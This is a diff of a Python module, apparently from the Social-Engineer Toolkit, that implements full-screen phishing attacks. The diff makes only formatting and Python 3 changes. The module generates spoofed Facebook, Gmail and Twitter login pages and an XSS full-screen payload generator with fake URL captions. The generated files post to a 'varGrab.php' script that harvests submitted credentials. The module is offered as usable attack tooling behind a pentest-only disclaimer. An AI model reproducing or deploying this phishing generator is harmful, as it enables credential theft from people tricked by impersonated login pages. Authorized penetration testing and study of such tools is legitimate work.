@@ -1,9 +1,9 @@
 # -*- coding: utf-8 -*-
 #!/usr/bin/env python
-#---------------------------------------------------------------------------------
+#-------------------------------------------------------------------------
 # ATTENTION: UTF 8 is for non xss fullscreen attacks that have actual html code in the functions
 # If this is converted to python3 utf8 coding can be taken out.
-#---------------------------------------------------------------------------------
+#-------------------------------------------------------------------------
 #
 #      Addon Category:  Web Attacks
 #	   Attack Type:     Full Screen Attacks / SET Addon Module
@@ -11,22 +11,22 @@
 #      Twitter:         @d4rk0s
 #	   Version:         1.0
 #	   File:            fsattacks.py
-#	   Purpose:         This holds every class/method for the setoolkit fullscreen attacks under the website attacks category 
+#	   Purpose:         This holds every class/method for the setoolkit fullscreen attacks under the website attacks category
 #                       including the XSS Fullscreen Generator Code :P
 #      License:         None This Code is For the Company TrustedSec and whatever they would like to do with it!
 #                       And Free for anyone else to take modify/distribute this take this whole header out whatever
 #                       I just ask you give me some sort of credit.
-# 
+#
 #       ---------------------------------------------------------------------------------
 #       Attention: ** Read the README on how to implement and use this please. Ive made it extremely easy **
-#                      I also Started porting it to python3 right now it only runs with python 2.x 
+#                      I also Started porting it to python3 right now it only runs with python 2.x
 #                      I could port it over to python3 within a couple days if its serious?
 #        ---------------------------------------------------------------------------------
 #       Disclaimer:
 #
-#       This is designed purely for good and not evil. If you are planning on using     
-#       this tool for malicious purposes that are not authorized you are violating the terms       
-#       of service and license of this application. This is for Ethical/Proper phishing/pentesting 
+#       This is designed purely for good and not evil. If you are planning on using
+#       this tool for malicious purposes that are not authorized you are violating the terms
+#       of service and license of this application. This is for Ethical/Proper phishing/pentesting
 #       Testing ONLY! Leave this Disclaimer on this code if you reuse the code. Any other
 #       options on this program used in a malicious way is not attended and not supported!
 #       The utf8 coding at the top is due to the HTML code from the websites for the FullScreen
@@ -45,15 +45,16 @@ import os
 import sys
 import multiprocessing
 import subprocess
-import shutil, errno
+import shutil
+import errno
 import shutil
 from src.core.setcore import *
 
+
 class fullScreenAttacks():
 
-
     def __init__(self):
-	# Strings for application
+        # Strings for application
         self.menuTextFullScreen = ""
         self.inputData = ""
         self.inputDataTwo = ""
@@ -66,7 +67,8 @@ class fullScreenAttacks():
         self.xssProgramName = ""
         self.displayCWD = ""
         self.imageHold = ""
-        # Names of Fullscreen Folders/Subfolders Might change if names changed or something
+        # Names of Fullscreen Folders/Subfolders Might change if names changed
+        # or something
         self.dirFullScreenAol = self.findFullScreenDir("AOL")
         self.dirFullScreenOutLook = self.findFullScreenDir("OUTLOOK")
         self.dirFullScreenGmail = self.findFullScreenDir("GMAIL")
@@ -74,38 +76,37 @@ class fullScreenAttacks():
         self.dirFullScreenFacebook = self.findFullScreenDir("FACEBOOK")
         # XSS Image Names May Change on user Picks
         self.gmailLoginImage = "glogin.png"
-        self.fbLoginImage = "flogin.png" 
+        self.fbLoginImage = "flogin.png"
 
-	# Lists
+        # Lists
         self.storageList = []
         # Dictonary
         self.storageDict = {}
-	# Tuples
+        # Tuples
 
-  
+   ##########################################################################
+   ##########################################################################
 
-   ################################################################################
-   ################################################################################
+    def findFullScreenDir(self, dirName):
+        # Simply check for Directory that holds all the FullScreen Files for moving ( GMAIL,FACEBOOK,TWITTER,OUTLOOK,AOL,CUSTOM)
+        # nothing advanced but if for some reason directory names become lower
+        # case we check
 
-    def findFullScreenDir(self,dirName):
-    # Simply check for Directory that holds all the FullScreen Files for moving ( GMAIL,FACEBOOK,TWITTER,OUTLOOK,AOL,CUSTOM)
-    # nothing advanced but if for some reason directory names become lower case we check 
- 
         if os.path.exists(dirName):
-            return dirName 
+            return dirName
         elif os.path.exists(str(dirName.lower())):
             return dirName.lower()
         else:
             # Directory not found
             return "NOT:FOUND"
 
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
-    def phishMenuMain(self,menuDisplay = True):
-    # This is the main menu function that displays the main intro menu
-    # after they pick Full Screen Attacks off the WebSite Attack category
-        
+    def phishMenuMain(self, menuDisplay=True):
+        # This is the main menu function that displays the main intro menu
+        # after they pick Full Screen Attacks off the WebSite Attack category
+
         if menuDisplay == True:
             # Display the menu also True on Default
             fullScreenAttackMsg = """
@@ -126,9 +127,9 @@ class fullScreenAttacks():
          Tricking the user into thinking there clicking on 
          a Login link from the actual Targeted Website ( Ex: FaceBook ) 
          or whatever you can think of doing. 
-        """      
+        """
 
-            self.outputText(fullScreenAttackMsg,"darkgreen")
+            self.outputText(fullScreenAttackMsg, "darkgreen")
 
             fullScreenOptions = """
              
@@ -140,7 +141,7 @@ class fullScreenAttacks():
         99) Return Back to Webattack menu
         """
 
-            self.outputText(fullScreenOptions,"yellow")
+            self.outputText(fullScreenOptions, "yellow")
 
         # Lets Grab the input
         self.displayPrompt()
@@ -149,43 +150,42 @@ class fullScreenAttacks():
         # Check if they wanna Exit
         try:
             # Check if user wants to display main menu
-            if str(self.inputData[0].replace(" ","")) == "" or str(self.inputData[0].replace(" ","")) == " ":
+            if str(self.inputData[0].replace(" ", "")) == "" or str(self.inputData[0].replace(" ", "")) == " ":
                 # Enable True for Prompt Return after Display
-                # Return back to prompt  
+                # Return back to prompt
                 self.phishMenuMain(False)
 
             # Display the FullScreen Menu for FullScreen Site Generation
-            elif str(self.inputData[0].replace(" ","")) == "1":
-                self.phishMenuFullScreen() 
-
+            elif str(self.inputData[0].replace(" ", "")) == "1":
+                self.phishMenuFullScreen()
 
             # Display XSS FullScreen Generator for sites with xss :D
-            elif str(self.inputData[0].replace(" ","")) == "2":
+            elif str(self.inputData[0].replace(" ", "")) == "2":
                 self.xssFullScreenGenerator()
 
             # \/ EDIT THE EXIT FUNCTION
             # Exit and Return back to WebAttack Menu
-            elif str(self.inputData[0].replace(" ","")) == "99":
+            elif str(self.inputData[0].replace(" ", "")) == "99":
                 # ***********************************************************************************************************
                 #  *********** TODO: add the function to bring the user back to the Web Attacks SET Main Menu  in this method
                 self.exitFullScreenPhish()
             # Spit Error nothing Good
             else:
                 # err loop back to prompt throw error message
-                self.outputText("\n\n[!] Error Please Select A Correct Option!\n\n","green") 
-                # Return back to prompt  
+                self.outputText(
+                    "\n\n[!] Error Please Select A Correct Option!\n\n", "green")
+                # Return back to prompt
                 self.phishMenuMain(False)
 
         # Two Exception Errors TODO: Add SETS Logging maybe?
         except TypeError:
-            pass 
- 
+            pass
 
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
-    def phishMenuFullScreen(self,menuDisplay = True):
-    # This is the  menu for FullScreen Attacks default auto displays menu Y
+    def phishMenuFullScreen(self, menuDisplay=True):
+        # This is the  menu for FullScreen Attacks default auto displays menu Y
 
         if menuDisplay == True:
             # Display Menu To See what the user wants to do?
@@ -209,16 +209,14 @@ class fullScreenAttacks():
         99) Return to Main Menu
        """
 
-	    # Display Main PhishFood FullScreen Attack Menu
-            self.outputText(self.menuTextFullScreen,"white")   
+            # Display Main PhishFood FullScreen Attack Menu
+            self.outputText(self.menuTextFullScreen, "white")
             # goto sleep b****
             time.sleep(1)
 
-
-
-	 # Lets Grab the input
+         # Lets Grab the input
         self.inputData = self.displayPrompt("FullScreen")
-       
+
         # Lets Decide What to do here
         try:
             # Check if user wants to display FullScreen Generator Menu
@@ -232,7 +230,7 @@ class fullScreenAttacks():
                 self.displayAboutFullScreen()
             # FaceBook Attack
             elif str(self.inputData[0]) == "1":
-                self.deployFullPhish("FB")               
+                self.deployFullPhish("FB")
             # GMAIL Attack
             elif str(self.inputData[0]) == "2":
                 self.deployFullPhish("GMAIL")
@@ -241,26 +239,28 @@ class fullScreenAttacks():
                 self.deployFullPhish("TWITTER")
             # Gmail Attack ------ NOT DONE
             elif str(self.inputData[0]) == "4":
-                self.errorOutput("\n\n [!] GMAIL FullScreen isn't done yet","blue")   
+                self.errorOutput(
+                    "\n\n [!] GMAIL FullScreen isn't done yet", "blue")
              # Outlook Attack ----- NOT DONE
             elif str(self.inputData[0]) == "5":
-                self.errorOutput("\n\n [!] Outlook FullScreen isn't done yet","blue")   
+                self.errorOutput(
+                    "\n\n [!] Outlook FullScreen isn't done yet", "blue")
             # Spit Error nothing Good
             else:
                 # err loop back to prompt throw error message
-                self.outputText("\n\n[!] Error Please Select A Correct Option!\n\n","yellow")   
+                self.outputText(
+                    "\n\n[!] Error Please Select A Correct Option!\n\n", "yellow")
                 # Return to correct prompt for more commands after err
                 self.phishMenuFullScreen(False)
         # Two Exception Errors
-        except (UnboundLocalError,TypeError):
+        except (UnboundLocalError, TypeError):
             pass
 
+   ##########################################################################
 
-   ################################################################################
-
-    def xssFullScreenGenerator(self,menuDisplay = True):
-    # This is the  menu for XSS FullScreen Generator , TRUE on default for menu display
-
+    def xssFullScreenGenerator(self, menuDisplay=True):
+        # This is the  menu for XSS FullScreen Generator , TRUE on default for
+        # menu display
 
         if menuDisplay == True:
 
@@ -272,7 +272,7 @@ class fullScreenAttacks():
             Welcome to SETs XSS FullScreen Generator   
            __________________________________________
         """
-            self.outputText(self.inputData,"green")
+            self.outputText(self.inputData, "green")
         # Display Remember Please
             self.inputData = """
         [!] Please Remember: 
@@ -287,7 +287,7 @@ class fullScreenAttacks():
             that really needs absolute paths specified.
         \n
         """
-            self.outputText(self.inputData,"yellow")   
+            self.outputText(self.inputData, "yellow")
 
             # ZzzZ for user display
             time.sleep(5)
@@ -337,13 +337,13 @@ class fullScreenAttacks():
        """
 
             # Display Main PhishFood FullScreen Attack Menu
-            self.outputText(menuTextFullScreen,"white")   
+            self.outputText(menuTextFullScreen, "white")
             # goto sleep b****
             time.sleep(.5)
- 
-	# Lets Grab the input
+
+        # Lets Grab the input
         self.inputData = self.displayPrompt("XSS")
-       
+
         # Lets Decide What to do here
         try:
             # Check if user wants to display XSS Generator Menu
@@ -354,19 +354,20 @@ class fullScreenAttacks():
                 self.phishMenuMain()
             # FaceBook Attack
             elif str(self.inputData[0]) == "1":
-                self.deployFullXSS("FB")               
+                self.deployFullXSS("FB")
             # Custom - Fullscreen Message should finish?
             elif str(self.inputData[0]) == "2":
                 # nothing not fully done yet display text
-                 self.errorOutput("\n\n [!] Custom Full-Screen XSS Generator not done yet","blue","XSS")   
+                self.errorOutput(
+                    "\n\n [!] Custom Full-Screen XSS Generator not done yet", "blue", "XSS")
             else:
                 # err loop back to prompt throw error message
-                self.errorOutput("\n\n[!] Error Please Select A Correct Option!\n\n","yellow","XSS")   
+                self.errorOutput(
+                    "\n\n[!] Error Please Select A Correct Option!\n\n", "yellow", "XSS")
 
         # Two Exception Errors
-        except (UnboundLocalError,TypeError):
+        except (UnboundLocalError, TypeError):
             pass
-
 
     #####################################################
     #####################################################
@@ -374,48 +375,49 @@ class fullScreenAttacks():
     def customFullScreenGenerator(self):
         pass
 
+    #####################################################
+    #####################################################
 
-    #####################################################
-    #####################################################
-    
-    def deployFullXSS(self,typeOf):
-    # Asks Questions and Deploys Specific XSS Generator Payload n File for Usage  
-  
+    def deployFullXSS(self, typeOf):
+        # Asks Questions and Deploys Specific XSS Generator Payload n File for
+        # Usage
+
         # init storage dictionary
         self.storageDict = {
-        "url"                  : "http://localhost/",
-        "redirect"             : "unknown",
-        "accountType"          : "unknown",
-        "imgDirPath"           : "unknown",
-        "imgDirXSS"            : "unknown",
-        "spoofWebURLCaption"   : "unknown",
-        "spoofWebURL"          : "unknown",
-        "spoofWebTitle"        : "Untitled",
-        "spoofWebStyleSheet"   : "unknown",
-        "spoofWebJS1"          : "unknown",
-        "spoofWebJS2"          : "unknown",
-        "spoofWebJS3"          : "unknown",
-        "spoofWebJS4"          : "unknown",
-        "spoofWebJS5"          : "unknown",
-        "uploadPath"           : "unknwon",
-        "cssFolderStatus"      : 1,
-        "jsFolderStatus"       : 1,
-        "imgFolderStatus"      : 1,
-        "cssFinalDest"         : "css",
-        "jsFinalDest"          : "js",
-        "imgFinalDest"         : "img",
-        "bufferOne"            : "unknown",
+            "url": "http://localhost/",
+            "redirect": "unknown",
+            "accountType": "unknown",
+            "imgDirPath": "unknown",
+            "imgDirXSS": "unknown",
+            "spoofWebURLCaption": "unknown",
+            "spoofWebURL": "unknown",
+            "spoofWebTitle": "Untitled",
+            "spoofWebStyleSheet": "unknown",
+            "spoofWebJS1": "unknown",
+            "spoofWebJS2": "unknown",
+            "spoofWebJS3": "unknown",
+            "spoofWebJS4": "unknown",
+            "spoofWebJS5": "unknown",
+            "uploadPath": "unknwon",
+            "cssFolderStatus": 1,
+            "jsFolderStatus": 1,
+            "imgFolderStatus": 1,
+            "cssFinalDest": "css",
+            "jsFinalDest": "js",
+            "imgFinalDest": "img",
+            "bufferOne": "unknown",
         }
-
 
         # now Clear screen and begin with creation
         self.displayProperOSClear()
 
-
         # SET Account Type to what user picked
-        if typeOf == "FB": self.storageDict["accountType"] = "Facebook"
-        elif typeOf == "GMAIL": self.storageDict["accountType"] = "Gmail"
-        else: self.storageDict["accountType"] = "Unknown"              
+        if typeOf == "FB":
+            self.storageDict["accountType"] = "Facebook"
+        elif typeOf == "GMAIL":
+            self.storageDict["accountType"] = "Gmail"
+        else:
+            self.storageDict["accountType"] = "Unknown"
 
         # FIRST question / Absolute file path
         self.inputData = """\n
@@ -442,17 +444,19 @@ class fullScreenAttacks():
 
         \n
         """
-        self.outputText(self.inputData,"yellow")   
+        self.outputText(self.inputData, "yellow")
         # Ask first question
-        self.results = raw_input("\nSpecify Absolute Host Path of Where Files Will be (Ex: www.site.net/folder ):\n")  
-        # check if its empty    
-        if len(str(self.results.replace(" ","")))  == 0 or len(str(self.results)) > 9000:
-            self.errorOutput("\n [!] Error no Specified Absolute Host Path!","blue","XSS")   
+        self.results = input(
+            "\nSpecify Absolute Host Path of Where Files Will be (Ex: www.site.net/folder ):\n")
+        # check if its empty
+        if len(str(self.results.replace(" ", ""))) == 0 or len(str(self.results)) > 9000:
+            self.errorOutput(
+                "\n [!] Error no Specified Absolute Host Path!", "blue", "XSS")
         else:
             # Make sure it doesn't have an ending /
-            if self.results[len(self.results)-1] == "/":
+            if self.results[len(self.results) - 1] == "/":
                 # Add Absolute Path to dictionary minus last / character
-                self.storageDict["url"] = self.results[0:len(self.results)-1]
+                self.storageDict["url"] = self.results[0:len(self.results) - 1]
             else:
                 # Add Absolute Path to Dictionary
                 self.storageDict["url"] = str(self.results)
@@ -470,17 +474,17 @@ class fullScreenAttacks():
 
         \n
         """
-        self.outputText(self.inputData,"white")   
+        self.outputText(self.inputData, "white")
         # Ask first question
-        self.results = raw_input("\nWhat Do you want the Page Title displaying the link to be?: ")  
-        # check if its empty    
-        if len(str(self.results.replace(" ",""))) == 0 or len(str(self.results)) > 9000:
+        self.results = input(
+            "\nWhat Do you want the Page Title displaying the link to be?: ")
+        # check if its empty
+        if len(str(self.results.replace(" ", ""))) == 0 or len(str(self.results)) > 9000:
             # SET DEFAULT BLANK
             self.storageDict["spoofWebTitle"] = " "
         else:
             # no heavy checking for now didnt really feel a need
             self.storageDict["spoofWebTitle"] = self.results
-
 
         # THIRD question / actual spoofed URL
         self.inputData = """\n
@@ -492,18 +496,19 @@ class fullScreenAttacks():
             keep the default settings
         \n
         """
-        self.outputText(self.inputData,"cyan")   
+        self.outputText(self.inputData, "cyan")
         # Ask first question
-        self.results = raw_input("\nWhat should the URL Address be Spoofed to?( Ex: http://www.gmail.com/voice/ ):\n ")  
-        # check if its empty    
-        if len(str(self.results.replace(" ",""))) == 0 or len(str(self.results)) > 9000:
+        self.results = input(
+            "\nWhat should the URL Address be Spoofed to?( Ex: http://www.gmail.com/voice/ ):\n ")
+        # check if its empty
+        if len(str(self.results.replace(" ", ""))) == 0 or len(str(self.results)) > 9000:
             # SET DEFAULT URL SPOOF DEPENDING ON WHAT WAS PICKED
             if typeOf == "FB":
                 self.storageDict["spoofWebURL"] = "http://www.facebook.com/"
             elif typeOf == "GMAIL":
-                self.storageDict["spoofWebURL"] = "http://www.gmail.com/"           
+                self.storageDict["spoofWebURL"] = "http://www.gmail.com/"
             else:
-                self.storageDict["spoofWebURL"] = "http://localhost"                
+                self.storageDict["spoofWebURL"] = "http://localhost"
         else:
             # no heavy checking for now didnt really feel a need
             self.storageDict["spoofWebURL"] = str(self.results)
@@ -516,69 +521,86 @@ class fullScreenAttacks():
 
         \n
         """
-        self.outputText(self.inputData,"red")   
+        self.outputText(self.inputData, "red")
         # Ask first question
-        self.results = raw_input("\nWhat should the Spoofed URL Say? (Ex: Shop Facebook ): ")  
-        # check if its empty    
-        if len(str(self.results.replace(" ",""))) == 0 or len(str(self.results)) > 9000:
+        self.results = input(
+            "\nWhat should the Spoofed URL Say? (Ex: Shop Facebook ): ")
+        # check if its empty
+        if len(str(self.results.replace(" ", ""))) == 0 or len(str(self.results)) > 9000:
             # SET DEFAULT URL SPOOF DEPENDING ON WHAT WAS PICKED
             if typeOf == "FB":
                 self.storageDict["spoofWebURLCaption"] = "Facebook Friends"
             elif typeOf == "GMAIL":
-                self.storageDict["spoofWebURLCaption"] = "Google Drive"           
+                self.storageDict["spoofWebURLCaption"] = "Google Drive"
             else:
-                self.storageDict["spoofWebURLCaption"] = "Login now"                
+                self.storageDict["spoofWebURLCaption"] = "Login now"
         else:
             # no heavy checking for now didnt really feel a need
             self.storageDict["spoofWebURLCaption"] = str(self.results)
-        
+
        # FIFTH question / Path where files will be uploaded to
         self.inputData = """\n
         [?] The path is where the folders & JavaScript Files for
             the attack will be generated / created in.
         \n
         """
-        self.outputText(self.inputData,"green")   
+        self.outputText(self.inputData, "green")
         # Ask question
-        self.results = raw_input("\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/d/Desktop/ ):\n ")  
-        # check if its empty    
-        if len(str(self.results.replace(" ","")))  == 0 or len(str(self.results)) > 9000:
+        self.results = input(
+            "\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/d/Desktop/ ):\n ")
+        # check if its empty
+        if len(str(self.results.replace(" ", ""))) == 0 or len(str(self.results)) > 9000:
             # ASK AGAIN
-            self.results = raw_input("\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/d/Desktop/ ):\n ")  
-            if len(str(self.results.replace(" ",""))) == 0 or len(str(self.results)) > 9000:
+            self.results = input(
+                "\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/d/Desktop/ ):\n ")
+            if len(str(self.results.replace(" ", ""))) == 0 or len(str(self.results)) > 9000:
                 if os.path.exists(str(self.results)):
                     self.storageDict["uploadPath"] = str(self.results)
-                else: self.errorOutput("\n[!] Error Specified Path not Found\n","yellow","XSS")
-            else: self.errorOutput("\n[!] Error Nothing Specified For the Second Time\n","yellow","XSS")
-        # check if path exists               
+                else:
+                    self.errorOutput(
+                        "\n[!] Error Specified Path not Found\n", "yellow", "XSS")
+            else:
+                self.errorOutput(
+                    "\n[!] Error Nothing Specified For the Second Time\n", "yellow", "XSS")
+        # check if path exists
         elif os.path.isdir(str(self.results)):
             # add upload path for uploading
             self.storageDict["uploadPath"] = str(self.results)
         else:
-            self.results = raw_input("\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/dd/Desktop/ ):\n ")  
-            if len(str(self.results.replace(" ",""))) == 0 or len(str(self.results)) > 9000:
+            self.results = input(
+                "\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/dd/Desktop/ ):\n ")
+            if len(str(self.results.replace(" ", ""))) == 0 or len(str(self.results)) > 9000:
                 if os.path.isdir(str(self.results)):
                     self.storageDict["uploadPath"] = str(self.results)
-                else: self.errorOutput("\n[!] Error Specified Path not Found\n","yellow","XSS")
-            else: self.errorOutput("\n[!] Error Nothing Specified For the Second Time\n","yellow","XSS")
+                else:
+                    self.errorOutput(
+                        "\n[!] Error Specified Path not Found\n", "yellow", "XSS")
+            else:
+                self.errorOutput(
+                    "\n[!] Error Nothing Specified For the Second Time\n", "yellow", "XSS")
 
         # LETS GENERATE THE FILES NOW
-        self.outputText("\n [x] Attempting to Write Files to Directory \n","magenta")
-   
+        self.outputText(
+            "\n [x] Attempting to Write Files to Directory \n", "magenta")
+
         # Grab Path Divider ( POSIX OR WINDOWS BASICALLY )
         self.inputData = self.storageDict["uploadPath"]
 
         # Get operating system path divider
         self.pathDivider = self.returnPathDivider(self.inputData)
 
-        # Craft and write Test file         
-        self.saveFile(self.storageDict["uploadPath"] + self.pathDivider + "test.txt","SET FULLSCREEN TESTING","text")
+        # Craft and write Test file
+        self.saveFile(self.storageDict[
+                      "uploadPath"] + self.pathDivider + "test.txt", "SET FULLSCREEN TESTING", "text")
         if os.path.isfile(self.storageDict["uploadPath"] + self.pathDivider + "test.txt"):
-            self.outputText("\n[x] Directory Success: Permission to Write Folders and Files :D \n","green")
+            self.outputText(
+                "\n[x] Directory Success: Permission to Write Folders and Files :D \n", "green")
             # Delete test file or try no check
-            os.remove(self.storageDict["uploadPath"] + self.pathDivider + "test.txt")
-        else:               
-            self.errorOutput("\n[!] Error Couldn't Write File. Check Permissions Please \n","yellow","XSS")
+            os.remove(self.storageDict["uploadPath"] +
+                      self.pathDivider + "test.txt")
+        else:
+            self.errorOutput(
+                "\n[!] Error Couldn't Write File. Check Permissions Please \n", "yellow", "XSS")
 
         # No other folders should be present with the names
         # js,img or css ... present user with alternative path
@@ -593,230 +615,270 @@ class fullScreenAttacks():
             path now. To quit and delete folders type 'quit' or 'q'
         \n
             """
-            self.outputText(self.inputData,"blue") 
-            self.results = raw_input("\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/dd/Desktop/attacks/ ):\n ")  
+            self.outputText(self.inputData, "blue")
+            self.results = input(
+                "\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/dd/Desktop/attacks/ ):\n ")
             # check if they wanna just exit
             if str(self.results).lower() == "quit" or str(self.results[0]).lower() == "q":
-                self.outputText("[!] Leaving and returning to FullScreen Attack Main Menu","yellow") 
+                self.outputText(
+                    "[!] Leaving and returning to FullScreen Attack Main Menu", "yellow")
                 self.phishMenuMain()
             # if its not a directory throw error
             elif not os.path.isdir(self.results):
-                self.results = raw_input("\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/dd/Desktop/ ):\n ")
+                self.results = input(
+                    "\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/dd/Desktop/ ):\n ")
                 if str(self.results).lower() == "quit" or str(self.results[0]).lower() == "q":
-                    self.outputText("[!] Leaving and returning to FullScreen Attack Main Menu","yellow") 
+                    self.outputText(
+                        "[!] Leaving and returning to FullScreen Attack Main Menu", "yellow")
                     self.phishMenuMain()
                 # if its not a directory throw error
                 elif not os.path.isdir(self.results):
-                    self.errorOutput("[!] Error No Directory Found Sir, Sorry Returning to Menu","yellow","XSS")
-                else: self.storageDict["uploadPath"] = str(self.results)
-            else: self.storageDict["uploadPath"] = str(self.results)
-                
+                    self.errorOutput(
+                        "[!] Error No Directory Found Sir, Sorry Returning to Menu", "yellow", "XSS")
+                else:
+                    self.storageDict["uploadPath"] = str(self.results)
+            else:
+                self.storageDict["uploadPath"] = str(self.results)
 
         # SET THE REST OF THE DICT VALUES
-        self.xssProgramName = "varGrab.php" # PHP PROGRAM THAT GRABS THE POST VARIABLES SENT TO IT
+        # PHP PROGRAM THAT GRABS THE POST VARIABLES SENT TO IT
+        self.xssProgramName = "varGrab.php"
         # Create the Rest of the Dictionary Variables
-        self.storageDict["imgDirPath"] =  "../" + self.storageDict["imgFinalDest"] + "/" # FOR THE CSS STYLE SHEETS IMG FOLDER LOCATION
-        self.storageDict["spoofWebStyleSheet"] =  self.storageDict["url"] + "/" + self.storageDict["cssFinalDest"] + "/" + "style.css" # ABSOLUTE OF CSS
+        # FOR THE CSS STYLE SHEETS IMG FOLDER LOCATION
+        self.storageDict["imgDirPath"] = "../" + \
+            self.storageDict["imgFinalDest"] + "/"
+        self.storageDict["spoofWebStyleSheet"] = self.storageDict[
+            "url"] + "/" + self.storageDict["cssFinalDest"] + "/" + "style.css"  # ABSOLUTE OF CSS
 
         # Check Account type for XSS image Path Creation
         if typeOf == "FB":
 
             # build image path
-            self.imageHold = os.getcwd() + self.pathDivider + self.dirFullScreenGmail + self.pathDivider + self.gmailLoginImage 
+            self.imageHold = os.getcwd() + self.pathDivider + self.dirFullScreenGmail + \
+                self.pathDivider + self.gmailLoginImage
             # Check if login image is present
             if os.path.isfile(self.imageHold):
                 # Create the Absolute path with url of XSS Image
-                self.storageDict["imgDirXSS"] =  self.storageDict["url"] + "/" + self.storageDict["imgFinalDest"] + "/" + self.gmailLoginImage
+                self.storageDict["imgDirXSS"] = self.storageDict[
+                    "url"] + "/" + self.storageDict["imgFinalDest"] + "/" + self.gmailLoginImage
             else:
-                self.outputText("[!] Error, Gmail Fullscreen XSS Gmail Image Not Found.","yellow") 
+                self.outputText(
+                    "[!] Error, Gmail Fullscreen XSS Gmail Image Not Found.", "yellow")
 
         # GMAIL TYPE SET PHISH/CUSTOM IMAGE
-        elif typeOf == "GMAIL": 
+        elif typeOf == "GMAIL":
             # build image path
-            self.imageHold = os.getcwd() + self.pathDivider + self.dirFullScreenGmail + self.pathDivider + self.gmailLoginImage 
+            self.imageHold = os.getcwd() + self.pathDivider + self.dirFullScreenGmail + \
+                self.pathDivider + self.gmailLoginImage
             # Check if login image is present
             if os.path.isfile(self.imageHold):
                 # Create the Absolute path with url of XSS Image
-                self.storageDict["imgDirXSS"] =  self.storageDict["url"] + "/" + self.storageDict["imgFinalDest"] + "/" + self.gmailLoginImage
+                self.storageDict["imgDirXSS"] = self.storageDict[
+                    "url"] + "/" + self.storageDict["imgFinalDest"] + "/" + self.gmailLoginImage
             else:
-                self.outputText("[!] Error, Gmail Fullscreen XSS Gmail Image Not Found.","yellow") 
+                self.outputText(
+                    "[!] Error, Gmail Fullscreen XSS Gmail Image Not Found.", "yellow")
 
-        self.storageDict["spoofWebJS1"] =  self.storageDict["url"] + "/" + self.storageDict["jsFinalDest"] + "/libs/" + "jquery-1.7.2.js" # JS FILE 1
-        self.storageDict["spoofWebJS2"] =  self.storageDict["url"] + "/" + self.storageDict["jsFinalDest"] + "/libs/" + "browser-detect.js" # JS FILE 2
-        self.storageDict["spoofWebJS3"] =  self.storageDict["url"] + "/" + self.storageDict["jsFinalDest"] + "/libs/" + "fullscreen-api-shim.js" # JS FILE 3
-        self.storageDict["spoofWebJS4"] = self.storageDict["url"]+"/"+self.storageDict["jsFinalDest"]+"/libs/"+"jquery-ui-1.8.18.custom.min.js"#JSFILE4
-        self.storageDict["spoofWebJS5"] =  self.storageDict["url"] + "/" + self.storageDict["jsFinalDest"] + "/" + "script.js" # JS FILE 5
-        self.storageDict["url"] =  self.storageDict["url"] + "/" + self.xssProgramName + "?uL=" # THE FULL URL WITH uL POST VARIABLE
+        self.storageDict["spoofWebJS1"] = self.storageDict[
+            "url"] + "/" + self.storageDict["jsFinalDest"] + "/libs/" + "jquery-1.7.2.js"  # JS FILE 1
+        self.storageDict["spoofWebJS2"] = self.storageDict[
+            "url"] + "/" + self.storageDict["jsFinalDest"] + "/libs/" + "browser-detect.js"  # JS FILE 2
+        self.storageDict["spoofWebJS3"] = self.storageDict[
+            "url"] + "/" + self.storageDict["jsFinalDest"] + "/libs/" + "fullscreen-api-shim.js"  # JS FILE 3
+        self.storageDict["spoofWebJS4"] = self.storageDict["url"] + "/" + self.storageDict[
+            "jsFinalDest"] + "/libs/" + "jquery-ui-1.8.18.custom.min.js"  # JSFILE4
+        self.storageDict["spoofWebJS5"] = self.storageDict[
+            "url"] + "/" + self.storageDict["jsFinalDest"] + "/" + "script.js"  # JS FILE 5
+        self.storageDict["url"] = self.storageDict[
+            "url"] + "/" + self.xssProgramName + "?uL="  # THE FULL URL WITH uL POST VARIABLE
 
         ######
 
-        # Done with Folders lets Craft Code and upload files to folders create XSS Payload  
+        # Done with Folders lets Craft Code and upload files to folders create XSS Payload
         # IF FACEBOOK
-        if typeOf == "FB": 
-            self.outputText("\n[x] Copying/Moving Folders & Creating Facebook Files.......\n","magenta")
-        
-        # Copy the rest of the img files now
-        self.outputText("\n[x] Attempting to move IMG Files to the IMG Directory.......\n","red")
         if typeOf == "FB":
-            imageFileDirectory = os.getcwd() + self.pathDivider  + self.dirFullScreenFacebook + self.pathDivider  + "img"
+            self.outputText(
+                "\n[x] Copying/Moving Folders & Creating Facebook Files.......\n", "magenta")
+
+        # Copy the rest of the img files now
+        self.outputText(
+            "\n[x] Attempting to move IMG Files to the IMG Directory.......\n", "red")
+        if typeOf == "FB":
+            imageFileDirectory = os.getcwd() + self.pathDivider + \
+                self.dirFullScreenFacebook + self.pathDivider + "img"
         elif typeOf == "GMAIL":
-            imageFileDirectory = os.getcwd() + self.pathDivider  + self.dirFullScreenGmail + self.pathDivider  + "img"
-        
-        newImgDirectory = self.storageDict["uploadPath"] + self.pathDivider + self.storageDict["imgFinalDest"]
-        err = self.copyJunk(imageFileDirectory,newImgDirectory)
+            imageFileDirectory = os.getcwd() + self.pathDivider + \
+                self.dirFullScreenGmail + self.pathDivider + "img"
+
+        newImgDirectory = self.storageDict[
+            "uploadPath"] + self.pathDivider + self.storageDict["imgFinalDest"]
+        err = self.copyJunk(imageFileDirectory, newImgDirectory)
         if err == "COPY":
-            pass 
+            pass
         time.sleep(1)
 
         # Copy all javascript files to js directory
-        self.outputText("\n[x] Attempting to move JS Files to JS Folder.......\n","cyan")
+        self.outputText(
+            "\n[x] Attempting to move JS Files to JS Folder.......\n", "cyan")
         self.storageDict["jsFinalDest"] = "js"
 
         if typeOf == "FB":
             # if path exists lets try to move n copy it
-            if os.path.exists(os.getcwd() + self.pathDivider  + self.dirFullScreenFacebook + self.pathDivider  + "js"):
-                jsCompletePath = os.getcwd() + self.pathDivider  + self.dirFullScreenFacebook + self.pathDivider  + "js"
+            if os.path.exists(os.getcwd() + self.pathDivider + self.dirFullScreenFacebook + self.pathDivider + "js"):
